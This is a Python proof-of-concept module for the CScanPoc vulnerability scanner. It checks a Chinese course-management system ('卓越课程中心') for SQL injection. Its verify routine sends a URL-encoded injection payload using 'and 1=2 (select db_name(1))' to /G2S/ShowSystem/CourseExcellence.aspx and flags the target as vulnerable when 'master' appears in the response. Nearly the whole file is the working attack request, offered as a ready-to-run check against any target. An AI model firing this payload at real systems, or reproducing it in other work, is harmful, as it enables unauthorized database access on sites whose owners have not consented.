# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'able_G2S_0002' # 平台漏洞编号，留空
    name = '卓越课程中心 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        卓越课程中心 /G2S/ShowSystem/CourseExcellence.aspx?page=1&level=%E5%9B%BD%E5%AE%B6%E7%BA%A7%27%20and%201=2%20(select%20db_name(1))--- SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '卓越课程中心'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '609676ca-d387-4618-a6e5-1320b9ff5d64'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/G2S/ShowSystem/CourseExcellence.aspx?page=1&level=%E5%9B%BD%E5%AE%B6%E7%BA%A7%27%20and%201=2%20(select%20db_name(1))---'
            verify_url = self.target + payload
            #code, head,res, errcode, _ = curl.curl2(url)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'master' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
